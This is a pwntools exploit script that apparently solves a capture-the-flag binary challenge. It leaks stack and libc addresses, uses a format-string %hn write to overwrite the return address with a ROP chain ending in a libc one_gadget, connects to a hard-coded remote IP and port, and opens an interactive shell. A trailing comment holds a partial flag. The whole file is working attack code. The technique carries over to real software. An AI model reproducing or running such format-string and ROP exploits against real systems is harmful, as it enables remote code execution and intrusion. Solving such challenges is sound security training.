#!/usr/bin/env python3
from pwn import *
# helper
def str2hex(str):
    return int('0x' + str.encode()[::-1].hex(), 16)

context.terminal = 'wt.exe sp -d . wsl.exe -d Ubuntu'.split()
context.arch = 'amd64'
conn = 'nc 34.70.212.151 8003'.split()
host, port = conn[1], int(conn[2])
e = ELF('./challenge')
lib = ELF('./libc.so.6', checksec=False)

script = """
brva 0x000000000001446
brva 0x000000000001501
c
"""

if args.REMOTE:
    p = remote(host, port)
elif args.GDB:
    p = gdb.debug(e.path, gdbscript=script, aslr=False)
else:
    p = process(e.path)

def write(addr, val):
    for i in range(6):
        word = val>>8*i & 0xff 
        if word == 0:
            payload = f'%8$hn'.encode()
        else:
            payload = f'%{word}c%8$hn'.encode()
        payload = payload.ljust(16, b'a') + p64(addr+i)
        print(payload)
        print(len(payload))
        p.sendlineafter(b'>> ', b'2')
        p.sendlineafter(b'>> ', payload)

p.sendlineafter(b'>> ', b'1')
data = p.recvline().split(b' ')
stack = int(data[0], 16)
lib.address = int(data[1], 16) - lib.sym.fgets
info("stack " + hex(stack))
info("lib.address " + hex(lib.address))

ret_addr = stack + (0x7ffeaffcc6b8-0x7ffeaffcc680)
rdi = 0x001bbca1+lib.address
rsi = 0x001baf97+lib.address
rdx = 0x000796a2+lib.address
rbp = 0x001bb980+lib.address
rcx = 0x0003d1ee+lib.address
ret = 0x001bc063+lib.address
one_gadget = 0x50a47+lib.address

rop = [rcx, 0, rbp, 0, one_gadget]

for i in range(len(rop)):
    write(ret_addr+i*8, rop[i])
    
# gdb.attach(p, gdbscript=script)
# pause()
p.sendlineafter(b'>> ', b'3')

p.interactive()

# i hate fmtstr
# flag{F0rm47_5tr1ng5_4r3_7o0_3asy